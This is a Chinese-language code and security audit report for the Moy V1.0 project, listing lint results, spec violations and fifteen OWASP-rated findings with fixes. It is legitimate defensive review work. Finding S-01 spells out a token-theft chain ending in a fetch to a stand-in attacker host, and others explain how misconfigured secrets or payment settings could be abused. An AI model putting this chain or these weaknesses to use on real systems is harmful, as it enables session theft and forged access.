# 麦子（Moy）V1.0 代码质量与安全漏洞审计报告

| 项 | 内容 |
| --- | --- |
| 审计日期 | 2026-11-02 |
| 审计人 | 寇豆码（工程师） |
| 仓库 | `C:\Users\15864\Desktop\麦子`，分支 `main`，HEAD `e3734a0` |
| 审计模式 | **只读**（未修改任何源码/配置；仅新增本报告文件） |
| 范围 | ①代码质量与规范一致性 ②安全漏洞（OWASP 分类） |
| 对照基线 | 项目强制规范 1-7 条（统一响应 / 错误码注册制 / 路径与命名 / `OA_` 与日志字段 / 鉴权 / 技术黑盒化 / 前端组件统一） |

---

## 一、审计范围与方法

### 1.1 实跑命令清单（全部为本机真实执行，未改写输出）

| # | 命令 | 工作目录 | 退出码 | 实测结果 |
| --- | --- | --- | --- | --- |
| G1 | `.venv/Scripts/python.exe -m ruff check .` | `apps/adapter` | **0** | `All checks passed!` → **0 error / 0 warning** |
| G2 | `.venv/Scripts/python.exe -m ruff format --check .` | `apps/adapter` | **1** | **4 files would be reformatted**, 384 files already formatted（共扫 388） |
| G3 | `.venv/Scripts/python.exe -m mypy app` | `apps/adapter` | **0** | `Success: no issues found in 205 source files`（**0 error**，但 `strict = false`，见 Q-07） |
| G4 | `npx eslint . --max-warnings=0` | `apps/web` | **0** | 无任何输出 → **0 error / 0 warning** |
| G5 | `npx tsc --noEmit` | `apps/web` | **0** | 无任何输出 → **0 error** |
| G6 | `.venv/Scripts/python.exe scripts/check_error_catalog.py` | `apps/adapter` | **0** | 三处一致门禁通过（G-13）：`errors.py = 66 码`、`business-errors.ts = 65 码`、`生产代码引用 = 64 码`、`架构 §7.1 → errors.py 27/27`；内部码 `17002` 外泄 0 命中 |
| G7 | `python deploy/validate_secrets.py` | 仓库根 | **0** | `[OK] 密钥兜底扫描通过：无密钥类变量带明文兜底` |
| G8 | 运行时路由导出（`app.openapi()`） | `apps/adapter` | **0** | **99 个操作 / 81 条路径**（`/metrics` 以 `include_in_schema=False` 排除在外） |

**G2 失败的 4 个文件（唯一门禁红灯）：**

| 文件 | 行:列 |
| --- | --- |
| `apps/adapter/app/business/member_service.py` | `:194:27` |
| `apps/adapter/app/services/identity_service.py` | `:253:48` |
| `apps/adapter/tests/integration/test_org_repo_pg.py` | `:115:54` |
| `apps/adapter/tests/security/test_endpoint_permissions.py` | `:81:40` |

失败原因均为**单行超长被折成多行**（ruff format 想合并回一行），不涉及语义。

**与 README 声明的比对：**

| README 声明 | 实测 | 结论 |
| --- | --- | --- |
| `README.md:187` 「Python Lint / Format \| ruff \| 零告警」 | G1 通过，**G2 失败（4 文件）** | ❌ **声明不成立**（见 Q-09） |
| `README.md:188` 「mypy \| 零 error」 | G3 通过，0 error | ✅ 成立 |
| `README.md:191` 「tsc \| 零 error」 | G5 通过，0 error | ✅ 成立 |
| `README.md:227` 「`ruff check` / `ruff format` / `mypy`（205 文件）全绿」 | 205 文件数**准确**；但「全绿」不成立（G2 红） | ⚠️ 部分不成立 |

### 1.2 代码规模实测

| 侧 | 文件数 | 行数 | 说明 |
| --- | --- | --- | --- |
| `apps/adapter/app` | **205** 个 `.py` | 27,217 | 与 mypy "205 source files"、README "205 文件" 一致 |
| `apps/web/src` | 174 个 `.ts/.tsx`（含测试） | 23,629（**排除 `*.test.*`**） | — |
| 后端对外端点 | — | — | **99 操作 / 81 路径**（OpenAPI 实跑） |

### 1.3 方法

1. 先跑全部门禁（§1.1），记录真实退出码与输出；
2. 静态检索 + **关键路径逐行阅读**：`core/security.py`、`core/config.py`、`core/crypto.py`、`core/ratelimit.py`、`core/idempotency.py`、`core/logging.py`、`middleware/error_handler.py`、`db/repositories/base.py`、`api/v1/{agent,artifact_files,billing,rag}.py`、`tools/*.py`、`services/rag_service.py`、`apps/web/src/lib/{api-client,session-store,business-errors}.ts`、`next.config.js`、`deploy/nginx/lite.conf`；
3. 前后端契约用**运行时 OpenAPI 导出**与 `api-client.ts` 的 `request()` 调用点做集合 diff（而非肉眼抽样）；
4. 安全结论一律标注「能否被实际利用」，无法确证的标 **待验证**。

---

## 二、规范一致性问题（Q）

| 编号 | 规范条目 | 违规位置 | 实例数 | 说明与建议 |
| --- | --- | --- | --- | --- |
| **Q-01** | 规范 1：统一响应 `{code,message,data}` | `app/api/v1/agent.py:350-374`、`app/api/v1/model.py:80-103`、`app/api/v1/artifact_files.py:44-92`、`app/api/v1/router.py:128-138` | **4** 类端点 | SSE 流（2 处）、产物二进制下载（1 处）、Prometheus 文本（1 处）均绕过 JSON 信封。**这 4 处均有明确文档串说明为设计豁免**（SSE 开始写出后无法再返回错误体；下载链路不应出现 JSON 错误信封）。判定：**合规的有意豁免，非缺陷**。唯一遗留：SSE 的 `error` 帧携带 `{"code":…, "message":…}`（`services/model_service.py:1209,1379,1476`），`code` 会到达浏览器——建议前端明确约定只读 `message`。 |
| **Q-02** | 规范 2：错误码注册制 | G6 全绿；全仓 `grep -E "ApiError\((2\|1\|3)[0-9]{4}"` 仅 **1** 处命中且位于**文档串**（`business/credential_service.py:16`） | **0** 处真实硬编码 | 端点层 100% 引用 `ErrorCode.*` 常量。message 侧未见拼接堆栈/SQL/URL/模型名（`ApiError.message` 来自注册表，`internal_detail` 只进日志，见 `core/errors.py:553-571`）。**这一维度质量很高。** |
| **Q-03** | 规范 6：技术黑盒化（前端不得出现模型名/向量库/RAG/Agent） | ①`apps/web/src/app/(main)/about/page.tsx:31-48`（**用户可见**）②`apps/web/src/lib/api-client.ts:704,715,807,810`（仅注释）③`apps/web/src/lib/business-errors.ts:18,38,48`（仅注释） | ①**13 条依赖名** ②③忽略 | ①`OPEN_SOURCE_COMPONENTS` 向终端用户直接展示 `Dify`（role=「工作流底座」）、`pgvector`（role=「记忆检索所需的数据库扩展」）、`Keycloak`。**这是实质违规**——「工作流底座」「记忆检索所需的数据库扩展」已把技术选型讲明，与黑盒化目标冲突。建议：保留开源合规声明但改用业务语言（如「流程执行引擎」「数据存储与检索引擎」），或移入交付包 `docs/compliance/` 不渲染到页面。②③注释不影响用户，可接受。 |
| **Q-04** | 规范 4：structlog JSON 必带 `trace_id/tenant_id/user_id/event` | `app/core/logging.py:90-96` `_inject_context` 用 `setdefault` **强制补齐 4 字段** | ✅ 覆盖全部 | 机制级兜底，任意调用点都不会漏字段（抽查 `security.py`、`credential_service.py`、`payment_gateway.py`、`plugin_service.py`、`model_service.py` 全部命中 4 字段）。**`print()` 残留 = 0**（`db/migrate.py` 的 18 处是 CLI 子命令输出，不在请求链路）。**但**：`logging.py:71 redact()` 已实现却**从未被引用、也未挂进 processors 链**（见 S-13）。 |
| **Q-05** | 技术债标记统计 | `TODO\|FIXME\|HACK\|XXX` = **1** 处（`app/plugins/schema.py:183` 的字符串常量 `"TODO"`，属插件占位符枚举，**不是**技术债标记）；`待补` = 1 处（同文件 `:182`） | **真实技术债标记 0 处** | 无 `pass` / 无 `...` / 无「暂时先这样」。这是**罕见的高水位**：说明债务靠文档串显式登记（`审计 2026-xx-xx Lx` 共 60+ 处引用）而非 TODO 堆积。代价是债务只在注释里，无法被工具聚合（建议后续把已接受的权衡抽成 `docs/tech-debt.md` 索引）。 |
| **Q-06** | 死代码/重复 | ①`app/core/logging.py:58 is_sensitive()` / `:71 redact()` **零引用** ②`apps/web/src/lib/types.ts:164 KnowledgeBase` 仅被 `:426 KnowledgeBaseDetail` 继承，无独立使用 | **2** 处 | ①是死代码，同时也是缺失的一层防护（见 S-13）②见 Q-08。另：`app/api/v1/plugin_deps.py` 虽 0 个端点，但被 `plugins.py:29` 与 `agent.py:84` 引用，**不是**死代码。`__init__.py` 无空导出（`middleware/__init__.py` 3 行但有实际导出）。 |
| **Q-07** | 类型质量 | `apps/adapter/pyproject.toml:159 strict = false`；`:168 ignore_missing_imports = true`；`Any` 出现 **451** 次 / 205 文件 / 27,217 行 | `# type: ignore` = **18** 处 | mypy「205 文件零 error」是**在 `strict=false` + 全局 `ignore_missing_imports` 下达成的**：`disallow_any_explicit`、`disallow_any_generics`、`disallow_untyped_calls`、`strict_equality`、`no_implicit_reexport` **均未开启**。已开启的强项：`disallow_untyped_defs`、`warn_return_any`、`no_implicit_optional`、`check_untyped_defs`。`type: ignore` 分布高度集中（17 在 `db/migrate.py` 的 `[attr-defined]`、1 在 `main.py:505` 的 `[method-assign]`）→ **未滥用**，且开了 `warn_unused_ignores = true` 自动防过期。建议：把 `strict = false` 在 README 的「全绿」表述中显式披露，避免读者误以为 strict 模式通过。 |
| **Q-08** | 规范 3 / 前后端契约一致性 | `apps/web/src/lib/types.ts:164-171 KnowledgeBase` vs `apps/adapter/app/schemas/rag.py:134-161 KnowledgeBaseItem` | 1 处漂移 | 后端 `KnowledgeBaseItem` 有 **9 个必填字段**（含 `chunk_policy`、`my_role`、`updated_at`）；前端 `KnowledgeBase` 只有 6 个，缺的 3 个由 `KnowledgeBaseDetail:426-435` 以**可选**方式补上，`api-client.ts:713` 又 `export type KnowledgeBaseItem = KnowledgeBaseDetail`。后果：前端把后端**必填**字段声明为**可选**，`tsc` 无法拦住漏用。当前 UI 都写了 `?? 'default'` 兜底故**未产生功能错误**，但契约校验能力被削弱。建议把这 3 个字段在 `KnowledgeBase` 里改为必填。 |
| **Q-09** | 规范门禁声明真实性 | `README.md:187`、`README.md:227` | 1 处 | 「ruff format 零告警 / 全绿」不成立（G2 实测 4 文件需重排）。属**文档失真**，不是代码缺陷，但会让下游误判 CI 状态。建议：要么修掉 4 处格式，要么在 README 注明「ruff format 尚余 4 处待整理」。 |
| **Q-10** | 文档串陈旧 | `apps/adapter/app/main.py:13`「挂载 v1 路由（**30 个核心业务端点** + 2 个免鉴权探针）」 | 1 处 | 实际 **99 操作 / 81 路径**。同一文件 `:28` 又写「99 个操作」，前后自相矛盾。建议统一为运行时口径。 |
| **Q-11** | 规范 5：写接口需 `Idempotency-Key` 且可重放安全 | 前端 `apps/web/src/lib/api-client.ts:296-299` + `:449-467` | 影响全部写接口 | 后端 53 个写端点中 **52 个**挂了 `IdempotencyManager` 依赖（`model.py` 的 `/generate/stream` 例外，文档串明确「流式不参与幂等回放」→ 合规）。**但前端在 `buildHeaders()` 里对每个写请求都 `newIdempotencyKey()` 现场生成新 UUID**：用户双击提交 / 网络重试 / 用户回退再提交，拿到的是**不同幂等键**，后端无从去重。→ 幂等机制在 UI 侧被架空，只剩 API 直调者受益。建议：把幂等键与「用户动作」绑定（如表单实例化时生成一次，或在 mutation 层持有至成功）。 |
| **Q-12** | 规范 1：前端只展示 message，禁止透传技术细节 | `apps/web/src/lib/business-errors.ts:225-227` | 1 处 | `toBusinessMessage()` 对**非** `BusinessError` 的任意 `Error` 直接 `return error.message`。`fetch` 层面的 `TypeError: Failed to fetch`、TLS 证书错误、`SyntaxError` 等**英文技术文案会原样进 toast**。低概率但真实。建议：非 `BusinessError` 一律回落 `UNKNOWN_ERROR_MESSAGE`，原文只 `console.error`。 |

### 2.1 前后端端点对齐（运行时 diff，非抽样）

后端 **99 操作** ↔ 前端 `api-client.ts` 实测 **87 个调用点**。**13 个后端端点前端无调用**：

| 后端端点 | 判定 |
| --- | --- |
| `GET/POST/DELETE/PATCH /api/v1/model/conversations[/{id}][/messages]`（4 个） | ⚠️ **真实功能缺口**：`components/chat/conversation-sidebar.tsx` 与 `hooks/use-conversation-store.ts` 只用本地 store，**从不拉取后端会话历史**。刷新页面即丢失历史列表（后端已实现且带租户隔离） |
| `GET/DELETE/POST /api/v1/ops/tenant-data[/export]`（2 个） | ⚠️ **真实功能缺口**：数据导出/删除（合规「数据权利」入口）前端**零调用**，用户自助入口缺失 |
| `GET /api/v1/agent/tasks/{id}/events`、`POST /api/v1/model/generate/stream` | ✅ 误报：经 `openStream()`（`api-client.ts:527,908`）调用，非 `request()` |
| `POST /api/v1/knowledge/bases/{id}/documents` | ✅ 误报：经 `upload()`（`api-client.ts:753`）调用 |
| `GET /files/artifacts/{token}` | ✅ 正常：`artifact-card.tsx:163` 用后端下发的 `download_url` 直接跳转（但该路径在 nginx 下未路由，见 S-03） |
| `GET /healthz`、`/readyz` | ✅ 误报：`api-client.ts:1576,1583` 自行拼 URL |

**未发现的漂移**：`ToolConnection`（后端 `schemas/tool.py:169` ↔ 前端 `types.ts:316`）字段与枚举**完全一致**；`/model/usage` 的 `UsageData` 与前端 SSE 内的 `Usage` 是两个不同对象，非漂移。

---

## 三、安全问题清单（S）

> **分级结果：高 1 条（S-01）/ 中 5 条（S-02…S-06）/ 低 9 条（S-07…S-15），共 15 条。**
>
> 每条均标注「可利用性判断」。**目前唯一"能实际利用且后果严重"的是 S-01**（且需先存在 XSS 注入点——全仓暂无）。S-03 是**确定性功能缺陷**（不是安全漏洞，但会让下载功能在生产 404）。S-04/S-05/S-06 均为**纵深/配置型**风险，当前不可由攻击者直接触发。凡无法确证的已明确标 **待验证**。

### 3.1 高

| 编号 | OWASP | 问题 | 证据（文件+行号） | 可利用性判断 | 修复建议 |
| --- | --- | --- | --- | --- | --- |
| **S-01** | A05 Security Misconfiguration / A03 XSS 放大 | **令牌链路纵深仍缺失（前轮 M7 未闭环）**：①访问令牌存 `localStorage`；②CSP `script-src 'self' 'unsafe-inline'`（未 nonce 化）；③`connect-src 'self' http: https:` 等于**不限制出站目标** | ①`apps/web/src/lib/session-store.ts:72`（`window.localStorage`）、`:14`、`:18-28`（文件自认权衡）②`apps/web/next.config.js:51`③`apps/web/next.config.js:55` | **可实际利用（有条件）**：单独看每一项都不致命，**但三者叠加构成完整窃取链**——任意一处 DOM/依赖 XSS → 内联脚本可执行（unsafe-inline）→ 读 `localStorage['moy.session.v1'].access_token` → `fetch('https://attacker.example/?t=…')` 成功外传（connect-src 放开 `http:`/`https:` 任意域，CSP 不拦）。当前**未发现**注入点（`dangerouslySetInnerHTML` / `iframe` / `srcdoc` 全仓 0 命中，仅测试文件用 `innerHTML`），因此**不是"已被打穿"，而是"一旦有注入点即全线失守"**。另：`next.config.js:43-44` 自承 `connect-src http:` 是为私有化 HTTP 现场开的口子——则该口子对**所有**客户默认生效，属过度放开 | 三选一或组合：①（根治）迁 httpOnly+SameSite Cookie，链路见 `docs/security/token-storage-assessment.md`；②（过渡）CSP 改 nonce（`next/headers` 每请求 nonce + `<Script nonce>`），同时把 `connect-src` 收成「自助域名 + 由 `OA_ADAPTER_ORIGIN` 注入的适配层 origin」，不要写裸 `http:`；③（最小成本）至少在 `localStorage` 旁增加**短期内存令牌 + 刷新时用 refresh_token 换**，把长期口令移出可读存储。**这是 V1.0 上线前唯一必须决策的安全项。** |

### 3.2 中

| 编号 | OWASP | 问题 | 证据（文件+行号） | 可利用性判断 | 修复建议 |
| --- | --- | --- | --- | --- | --- |
| **S-02** | A05 / A03 | **产物下载：`Content-Disposition: inline` + 接受任意声明 MIME + 适配层响应不带 `nosniff`** —— 一旦该路径可达即构成同源存储型 XSS 面 | `apps/api/v1/artifact_files.py:84-92`（`media_type=record.content_type`；`Content-Disposition` 由 `:120-138` 返回 `inline`（`:137` 的 fallback 只替换了 `"`，未处理 CR/LF））；`db/repositories/artifact_repo.py:96-101`（`declared` 非 `application/octet-stream` 即原样采用，**无白名单**）；`grep -rn nosniff apps/adapter/app` → **0 命中**（适配层自身不发该头） | **当前不可利用（因 S-03 而路径 404）；但修 S-03 时不慎即打开**。利用链：插件（租户管理员安装，非完全可信）声明 `content_type="text/html"` + 产物内容为 HTML/JS → 用户访问 `/files/artifacts/{token}` → 浏览器按 HTML 渲染 → 脚本在**平台同源**下执行（`deploy/nginx/lite.conf:72` 的 `/api/` 与 `:142` 的 `/` 同 host，同源）→ 配合 S-01 直接取走 localStorage 里的令牌。**缓解事实**：`lite.conf:41` 的 server 级 `nosniff` 会被无 `add_header` 的 `location /`（`:142`）继承，所以**若运维按现状加一条"不带 add_header 的 location"反而会安全**；风险在于按常规写法自加 `add_header X-Frame-Options` 之类（nginx `add_header` 不继承，`:38-39` 已警告过这个坑）→ 把 server 级 `nosniff` 一并清掉 | ①`resolve_content_type` 加**白名单**（仅 `EXTENSION_CONTENT_TYPES` 内 6 类），未知统一降级 `application/octet-stream`；②`_content_disposition` 改 `attachment`（产物是"下载"不是"预览"）；③适配层对该响应显式下发 `X-Content-Type-Options: nosniff` + `Content-Security-Policy: sandbox`（不依赖网关继承）——**三件与 S-03 同批做，不要分开** |
| **S-03** | A05 / 可用性 | **产物下载路径在唯一交付编排（nginx）中未路由，生产环境必 404** | `deploy/nginx/lite.conf`、`lite-tls.conf`、`nginx.conf` 全部只有 `/healthz`、`/api/`、`/readyz`、`/metrics`、`/` 五类 location（`lite.conf:55,72,106,122,142`），**无 `/files/`**；`deploy/` 全域 `grep "files/artifacts\|/files/"` → **0 命中**；`deploy/k8s/` 只有 `README.md`（无 Ingress 可兜底）；而适配层该端点挂在 `/files/artifacts/{token}`（`api/v1/artifact_files.py:26`，**故意不带 `/api/v1` 前缀**，文档串给了理由） | **可实际复现，且是确定性的**：请求 `/files/artifacts/xxx` 命中 `location /`（`lite.conf:142`）→ 转给 Next.js（`proxy_pass http://$web_backend$request_uri`）→ 404。即「阶段三成果物下载」在**唯一交付编排下完全不可用**。不是理论风险，是部署配置缺陷 | 在 `lite.conf` / `lite-tls.conf` 增加 `location ^~ /files/artifacts/`，`proxy_pass http://$adapter_backend`，**并就地重复 `add_header X-Content-Type-Options nosniff always`**（`:38-39` 的注释正是在讲这个坑）。建议加一条走 nginx 入口的 e2e 下载用例 |
| **S-04** | A07 认证失效 / A05 | **`OA_PAY_CHANNEL=fake` 无生产守卫**：配上即关掉回调验签，可用伪造回调开通订阅 | `app/core/config.py:243`（`pay_channel: PayChannel = "wechat_pay"`，默认安全）、`:433-445`（`use_fake_payment_gateway` 在 `pay_channel=="fake"` 时**恒 True**，不再判 env）；`app/business/payment_gateway.py:316`（`FakeGateway` 确定性签名）；`app/core/security.py:865-968`（`validate_auth_startup` 只守 `auth_mode=stub` / `jwt_secret` / 降级开关，**完全不看 `pay_channel`**） | **不可由攻击者直接利用；需运维误配**：默认值 `wechat_pay` 安全，交付模板 `deploy/.env.example:259` 与 `.env.lite.example:203` 也都是 `wechat_pay`。风险在于「`auth_mode=stub` 有 30004 拦死，`pay_channel=fake` 却没有对应守卫」——**同一类"测试开关"两套待遇**，运维一旦在 .env 里复制粘贴即静默降级 | 在 `validate_auth_startup`（或新增 `validate_payment_startup`）增加第 4 条判据：`env in {staging, production} and pay_channel == "fake"` → 30004 启动失败，理由与 `stub` 同构 |
| **S-05** | A02 加密失效 / A05 | **`OA_JWT_SECRET` 用公开占位值可顺利通过启动校验**：`validate_auth_startup` 只判「非空」，不判「是否仍是模板占位」 | 校验侧：`app/core/security.py:909-917`（`if not conf.jwt_secret.strip(): raise`）；模板侧：`deploy/.env.example:160 OA_JWT_SECRET=CHANGE_ME_STRONG_PASSWORD`、`deploy/.env.lite.example:119` 同值 | **不可由攻击者直接利用；需运维跳过官方安装脚本**：`deploy/install.sh:409-434` 与 `deploy/validate_lite_up.sh:155-162` 都强制「`CHANGE_ME` 残留必须为 0」，所以**走官方路径是安全的**。但若客户用自有 k8s / 自写 compose 直接 `cp .env.example .env`，`CHANGE_ME_STRONG_PASSWORD` 会通过校验 → 签名密钥是**仓库公开常量** → 任何人可伪造任意租户/角色的 JWT。属经典 insecure default | 在 `validate_auth_startup` 增加占位值黑名单（`CHANGE_ME`、`changeme`、`password`、长度 < 32）→ 30004。与 S-04 一并做成「占位值统一拦截」 |
| **S-06** | A01 越权 / 纵深缺失 | **`require_permission` 空 permission 仍然直接放行（前轮 L3 未闭环）** | `apps/adapter/app/core/security.py:287-288`：`if not permission: return`（与 2026-10-31 审计定位的 `:287-288` **完全同一处，代码未改动**） | **当前不可利用**：全仓只有 2 个调用点——`security.py:348`（`guard_permission` 转发，11 处端点传的都是模块常量 `KB_*_PERMISSION`）；`services/identity_service.py:119`（传 `request.permission`，**但 `:116` 先调 `_validate_permission_point()`，空串/无冒号形态直接 400「14004 未注册」**，到不了 `require_permission`）。结论：是**潜在纵深缺口**，不是现存越权 | 改为 `raise ApiError(ErrorCode.FORBIDDEN)` 或（更稳）`raise ApiError(ErrorCode.CONFIG_ERROR)`——空权限点是**编码错误**而非用户错误，应让它在测试期就炸。同时补一条用例：`require_permission(auth, "")` 必须抛错 |

### 3.3 低

| 编号 | OWASP | 问题 | 证据（文件+行号） | 可利用性判断 | 修复建议 |
| --- | --- | --- | --- | --- | --- |
| **S-07** | A04 不安全设计 / 上传 | 上传**只校验扩展名**，无魔数、无文件名净化 | `app/services/rag_service.py:594-601`（`extension = file_name.rsplit('.',1)[-1]`，只比 `allowed_document_extensions`）；`:454`（`files={"file": (file_name, content, _content_type_of(file_name))}` 原样转下游）；全仓 `sanitize_filename\|secure_filename\|basename` **0 命中** | **低（几乎不可利用）**：上传内容先落 `tempfile.TemporaryFile()`（`api/v1/rag.py:176`），**不按文件名拼本地路径**，故无路径穿越；文件字节直接 `POST` 给下游，故无本地 RCE。仅存在「扩展名伪造 → 下游解析器吃到非预期格式」的间接风险（下游侧，不再本仓边界内）。大小限制真实生效（`config.py:373` 50MB + `rag.py:181-188` 流式累计判定） | ①加魔数嗅探（PDF `%PDF`、DOCX `PK\x03\x04`、TXT 无魔数放行）；②`file_name` 过 `Path(name).name` 去掉目录部分，并把 `\r\n` 替换掉（`artifact_files.py:115-134 _content_disposition` 的 `fallback` 只替换了 `"`，**未处理 CR/LF**） |
| **S-08** | A09 日志失效 | `redact()` 已实现但**未接入 structlog processors 链**，敏感字段自动掩码这层防护**实际不存在** | `app/core/logging.py:71-87`（定义 `redact`）、`:58-68`（`is_sensitive`）；`:115-129` 的 `processors` 列表**不含 `redact`**；全仓 `from app.core.logging import …redact` **0 命中** | **当前无实际泄露**：逐条抽查 `logger.*` 调用，未发现打印 token/密码/密钥**值**（`credential_service.py:109` 用 `api_key=<redacted>`、`:229-289` 只打事件名；`crypto.py:293-296` 只打 env/store）。属**待生效防护 + 死代码** | 把 `redact` 作为 processor 插到 `_inject_context` 之前：`lambda _l,_m,ed: redact(ed)`。注意它目前只处理顶层 dict 的 key，需先对 `event_dict` 做浅层 mask |
| **S-09** | A04 | 前端每次写请求都新生成幂等键 → 幂等对「双击/重试」完全不生效 | `apps/web/src/lib/api-client.ts:296-299`（`newIdempotencyKey()` per call）；`:260-268` 兜底用 `Math.random()` | **低**：不是安全漏洞，是**重复扣费/重复建单**的业务风险（如重复下订单、重复扣额度）。后端 `idempotency.py` 本身严谨（`check_or_set` 有指纹比对、`:52` 记录过"越权读+20007 包装"的历史缺陷已修） | 幂等键按期「用户动作」而非「HTTP 请求」生成（见 Q-11）；兜底 RNG 改 `crypto.getRandomValues` |
| **S-10** | A04 / 可用性 | 产物下载限流按 `request.client.host`，反代后**所有用户共享一个令牌桶** | `app/api/v1/artifact_files.py:65-77`（`client_ip = request.client.host`，`limit=60/60s`，key = `tenant_id:client_ip`）；`deploy/nginx/lite.conf:72-90`（`:82` 设了 `X-Real-IP`，但适配层**不读** XFF/X-Real-IP） | **不可用于绕过**（不信任 XFF 反而是正确的，避免伪造 IP 绕过限流——这点做对了）。但存在**反向 DoS**：nginx 后 `request.client.host` 是 nginx 容器 IP，全租户共用一个桶 → 任一大客户打满 60/min，其他人全部 429 | 与业务限流口径统一：改用已鉴权上下文（该端点无 Bearer，但令牌内有 `tenant_id` + `artifact_id`）→ 按 `tenant_id:artifact_id` 限流；或显式信任 `X-Real-IP`（仅在确认 nginx 是唯一入口时） |
| **S-11** | A04 / 可用性 | 限流与幂等后端默认 `memory`，多副本部署时**限流按副本数放大 N 倍、幂等静默失效** | `app/core/config.py:356,366`（均默认 `"memory"`）；`app/main.py:376-390`（生产环境仅 `logger.warning("cache_backend_memory_in_production")`，**不拦**） | **不可利用（V1.0 单副本下行为正确）**：三套编排均无 `replicas`，代码注释也明确写了「扩容前必须切」。属**水平扩展前的前置条件**，不是当前缺陷 | 保持现状即可，但建议把这条写进 `docs/lite-container-baseline.md` 的「扩容前置清单」，并在 `deploy/k8s/` 的 HPA 模板旁加注释告警 |
| **S-12** | A02 | JWT 算法未用 `Literal` 约束，可由环境变量改任意值 | `app/core/config.py:71 jwt_algorithm: str = "HS256"`（对比 `AuthMode`/`DeployMode`/`PayChannel` 都是 `Literal`）；`app/core/security.py:166-172`（`algorithms=[conf.jwt_algorithm]`） | **不可利用**：PyJWT 在 `verify_signature=True` 下对 `algorithms=["none"]` 会抛 `InvalidAlgorithmError`（`_decode_token` 统一转 20002）；且算法列表是**单元素**，不存在 HS/RS 混用。`verify_exp` 语义正确（`stub` 分支显式置回 `True` 修复了 PyJWT 反向默认，`:152-162`） | 改 `Literal["HS256","RS256","ES256"]`，让非法值在配置层就炸 |
| **S-13** | A09 | `pg_dump` 把含明文库密码的 DSN 作为命令行参数传递，进程列表可见 | `app/db/migrate.py:830-836`（`[pg_dump, "--no-owner","-Fc","-f",target, dsn]`） | **低**：需同机低权用户能读 `/proc/*/cmdline`（容器内通常同 UID）。`subprocess.run` 用**列表参数 + 无 `shell=True`**（`:830` 有 `noqa: S603` 且理由正确），**不存在命令注入** | 改走 `PGPASSWORD` 环境变量 + `-h/-U/-d` 分离参数，或 `.pgpass` 文件 |
| **S-14** | A05 | `deploy_mode` 默认 `saas`，但**全部交付预设都是 `private`** —— 默认值与交付形态不一致 | `app/core/config.py:52 deploy_mode: DeployMode = "saas"`；`deploy/.env.example:31`、`deploy/.env.lite.example:32`、`deploy/.env.lite:31` 均 `OA_DEPLOY_MODE=private` | **低**：`saas` 形态比 `private` **更严**（`private` 恒返回 `default` 租户，`saas` 才走跨租户成员校验 `security.py:612-614`），所以默认值本身不构成放宽。但会让「`private` 忽略 X-Tenant-Id」这条设计在漏配时失效，属**语义漂移**风险（详见 `docs/decisions/0007-tenant-context-source.md`） | 把默认值改为 `private`（与交付一致），或保持 `saas` 但在 `.env.example` 头注释里显式说明「不配 = saas 多租户语义」 |
| **S-15** | A03 / 信息暴露 | `/metrics` 与 `/readyz` 免鉴权 | `app/middleware/error_handler.py:54-62`（`AUTH_EXEMPT_PATHS` 含 `/metrics`）；`app/api/v1/router.py:128-138` | **不可利用**：`deploy/nginx/lite.conf:106-141`（`/readyz` 与 `/metrics` 两段）与 `lite-tls.conf:102-131` 都加了 `allow 127.0.0.1 / 10/8 / 172.16/12 / 192.168/16; deny all`，公网不可达。且指标标签只有 `route/method/status`（`middleware/metrics.py:60-63`），**不含 tenant_id/user_id**，泄露面几乎为零。另：适配层还额外把 `/metrics` 排除出 OpenAPI（实测 `grep /metrics openapi.paths` = False），减少暴露线索 | 无需改动。仅提示：若未来新增 `tenant_id` 标签，必须同步确认 nginx 内网限制仍在 |

### 3.4 已核实为「做得好」的安全控制（不列为问题，供对照）

| 项 | 证据 | 结论 |
| --- | --- | --- |
| **SQL 注入** | 全仓 `grep` f-string/`%`/`.format()` 拼进 `execute`/`text()` → **0 命中**；`db/repositories/base.py:123-146` 用 `assert_identifier()` 白名单 + 全参数绑定；`tenant_data_service.py:1289` 对动表名/列名过白名单 | ✅ 无 |
| **命令注入** | `subprocess` 仅 1 处（`migrate.py:830`），列表参数、无 `shell=True`、路径经 `shutil.which` 解析为绝对路径 | ✅ 无 |
| **租户隔离（IDOR）** | 所有仓储查询统一 `WHERE {repo.tenant_clause()} = :tenant_id`（`base.py:133`，`params()` 自动补齐 `:144`）；PG 侧叠加 **RLS 双保险** + 启动期 `BYPASSRLS_CHECK_SQL` 自检（`engine.py:46-48,227-260`）；跨租户切换强制 `assert_tenant_membership()`（`security.py:473-520`），`__platform__` 伪造先行拒绝（`:604-611`），成员校验在 `:612` | ✅ 强 |
| **SSRF** | 5 类连接器（邮箱/GitHub/企微/飞书/微信）**全部是桩实现**，`email_connector.py:6` 明写「返回业务化 mock 结果，**不发起任何真实第三方调用**」；唯一真实出站是 `clients/dify_client.py`，`base_url` 来自配置 `OA_DIFY_BASE_URL`，**用户不可控** | ✅ **当前不存在 SSRF 攻击面**（未来接真实连接器时必须补域名白名单 + 内网段拦截） |
| **密码学** | 凭据加密 AES-256-GCM、**12 字节 `os.urandom` nonce**、密钥版本化轮转（`core/crypto.py:37-40,240-247`）；全仓 `random.` 仅 1 处且标了 `noqa: S311`（重试抖动，非安全用途）；**本仓无密码登录**（OIDC 委托 IdP），故无 bcrypt/argon2 参数问题 | ✅ 强（无 IV 复用、无库内明文敏感字段） |
| **支付回调** | 验签**先于**领取幂等键（`order_service.py:469-517` 有详细理由说明为何顺序不能反）；验签失败落 `audit_log` 而非污染幂等键 | ✅ 设计正确 |
| **XSS（已知注入点）** | `dangerouslySetInnerHTML` / `iframe` / `srcdoc` / `eval` / `new Function` 在生产代码中 **0 命中**（仅测试文件用 `innerHTML` 清 DOM） | ✅ 无注入点（但 S-01 的 CSP 让"一旦有注入点"代价极高） |
| **CORS** | `allow_origins` 仅 dev 开 `localhost:3000`，其余环境为空（`main.py:491-493`，修过 `["*"]`+`credentials` 的非法组合） | ✅ 正确 |
| **硬编码凭据** | `sk-` / `AKIA` / `ghp_` / `BEGIN …PRIVATE KEY` 全仓扫描，**项目代码 0 命中**（唯一命中在 `.venv` 与 `node_modules` 第三方文件） | ✅ 无 |
| **限流覆盖面** | `enforce_ratelimit` 挂在 5 大业务路由级依赖（`api/v1/router.py:311`），53 写端点 / 46 读端点全覆盖；不读 XFF 故无伪造绕过 | ✅ 覆盖完整（IP 维度问题见 S-10） |
| **安全响应头（Web）** | `next.config.js:17-33`：`X-Frame-Options: DENY`、`nosniff`、HSTS、`Permissions-Policy` 全关、`Referrer-Policy` 且 `/auth/callback` 单独 `no-referrer` | ✅ 完备（CSP 例外见 S-01） |

---

## 四、前轮问题闭环核实

| 前轮编号 | 前轮描述 | 本轮核实结论 | 证据 |
| --- | --- | --- | --- |
